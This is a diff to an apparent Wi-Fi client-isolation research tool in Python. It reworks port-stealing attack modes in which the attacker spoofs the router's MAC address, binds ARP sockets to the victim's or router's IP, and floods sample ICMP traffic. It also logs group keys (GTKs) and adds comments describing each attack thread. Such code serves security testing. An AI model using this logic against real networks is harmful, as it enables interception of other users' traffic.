@@ -919,16 +919,15 @@ class Client2Client:
 				#log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
 				time.sleep(0.02)
-				# self.sup_victim.send_tcp_syn()
 
 	def send_uplink_frame2(self):
 		if self.options.c2c_port_steal_uplink is not None:
-			ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
-			p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"abcdefghijklmn")
-			log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
-			for _ in range(500):
+			for _ in range(500000):
+				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
+				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"abcdefghijklmn")
+				#log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
-				time.sleep(0.5)
+				time.sleep(0.02)
 			
 
 
@@ -947,7 +946,9 @@ class Client2Client:
 
 	def run(self):
 		# If not in PoC mode, let victim client connect.
-		if not self.options.poc:
+		if self.options.poc and self.options.c2c_port_steal:
+			pass
+		else:
 			self.sup_victim.start()
 			self.sup_victim.scan(wait=False)
 			self.sup_victim.wait_scan_done()
@@ -959,6 +960,7 @@ class Client2Client:
 			self.sup_victim.get_ip_address()
 
 		if self.options.c2c_port_steal_uplink is not None:
+			# In PoC mode, before running this script, the attacker has to set it's mac address to routermac. 
 			if self.options.poc is not True:
 				set_macaddress(self.options.c2c, self.sup_victim.routermac)
 			self.sup_attacker = Supplicant(self.options.c2c, self.options)
@@ -969,23 +971,26 @@ class Client2Client:
 
 		# [ Send a packet from the attacker to the victim ]
 
+		# Thread 1 is to let attacker send testing packets like C2C IP packets or C2C ethernet frames, or do port stealing.
 		thread1 = threading.Thread(target=self.send_c2c_frame)
-		if not self.options.poc:
+		# Thread 2 is to let victim monitor received packets. 
+		if not (self.options.poc and self.options.c2c_port_steal):
 			thread2 = threading.Thread(target=self.start_monitor)
 
+		# Thread 4 is to let attacker monitor received packets. 
 		if self.options.c2c_port_steal is not None:
 			thread4 = threading.Thread(target=self.start_attacker_receiver)
 		elif self.options.c2c_port_steal_uplink is not None:
 			thread4 = threading.Thread(target=self.start_attacker_receiver2)
 			
-
+		# Thread 3 is to let victim continuously send sample traffic like ICMP Echo. 
 		if not self.options.poc:
 			if self.options.c2c_port_steal is not None:
 				thread3 = threading.Thread(target=self.send_uplink_frame)
 			elif self.options.c2c_port_steal_uplink is not None:
 				thread3 = threading.Thread(target=self.send_uplink_frame2)
 				
-		if not self.options.poc:
+		if not (self.options.poc and self.options.c2c_port_steal):
 			thread2.start()
 		thread1.start()
 		if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
@@ -997,7 +1002,7 @@ class Client2Client:
 
 
 		thread1.join()
-		if not self.options.poc:
+		if not (self.options.poc and self.options.c2c_port_steal):
 			thread2.join()
 		thread4.join()
 		if not self.options.poc:
@@ -1049,11 +1054,12 @@ class Client2Client:
                 
                 # Let the attacker get an IP address, also
                 if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
+                		# In port stealing, we don't try getting an IP address. 
                         self.sup_attacker.get_ip_address()
-                elif self.options.c2c_port_steal is not None and self.options.poc is not True: 
+                elif self.options.c2c_port_steal is not None: 
                         self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.clientip, ARP_addr=self.sup_attacker.mac)
                         self.sup_attacker.can_send_traffic = True
-                elif self.options.c2c_port_steal_uplink is not None and self.options.poc is not True: 
+                elif self.options.c2c_port_steal_uplink is not None: 
                         self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.routerip, ARP_addr=self.sup_attacker.mac)
                         self.sup_attacker.can_send_traffic = True
                 self.attacker_connected = True
@@ -1064,7 +1070,7 @@ class Client2Client:
                         attacker_gtk = self.sup_attacker.get_gtk()
                         log(STATUS, f">>> The victim's GTK is ({victim_gtk}).", color="green")
                         log(STATUS, f">>> The attacker's GTK is ({attacker_gtk}).", color="green")
-                        return
+                        quit(0)
 
 
 class Client2Monitor:
